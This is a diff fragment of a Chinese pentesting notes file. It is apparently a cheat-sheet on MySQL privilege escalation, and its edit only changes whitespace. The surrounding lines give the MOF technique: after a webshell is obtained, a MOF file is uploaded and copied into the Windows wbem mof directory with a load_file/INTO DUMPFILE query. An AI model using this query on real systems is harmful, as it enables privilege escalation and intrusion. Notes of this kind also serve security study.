@@ -57,8 +57,8 @@ sys中的两种表：
 
 mysql 提权方式：  
 ***mof提权***   
-拿到 Webshell 后：
-1、找一个可写目录上传mof文件，例如上传到 C:/Windows/nullevt.mof \
+拿到 Webshell 后：   
+1、找一个可写目录上传mof文件，例如上传到 C:/Windows/nullevt.mof  
 2、执行load_file及into dumpfile把文件导出到正确的位置即可:
 >Select load_file('C:/Windows/nullevt.mof') into dumpfile 'c:/windows/system32/wbem/mof/nullevt.mof'  
 
